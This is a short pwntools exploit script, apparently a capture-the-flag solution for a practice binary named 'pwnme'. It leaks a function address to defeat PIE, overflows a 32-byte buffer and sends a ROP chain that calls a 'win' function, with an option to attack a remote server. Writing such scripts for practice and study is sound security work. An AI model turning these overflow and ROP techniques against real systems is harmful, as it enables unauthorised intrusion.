#!/usr/bin/env python3
from pwn import *


exe = './pwnme'

elf = context.binary = ELF('pwnme')
context.terminal = ['alacritty', '-e', 'zsh', '-c']

#context.log_level= 'DEBUG'



def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#### Exploit starts here ####

io = start()

OFFSET = 32

win = io.recvline().split()[5].strip()
win = int(win,16)
base_addr = win - 0x122e
pop_rdi = base_addr + 0x1323


elf.address = base_addr
rop = ROP(elf)
success(f"got win function addr {hex(win)}")
success(f"got base addr addr {hex(base_addr)}")
success(f"got pop rdi {hex(pop_rdi)}")



payload = b'A' * OFFSET
rop.raw(rop.ret)
rop.win()
rop.win(0xdeadbeefdeadbeef)
payload += rop.chain()

io.sendline(payload)

io.interactive()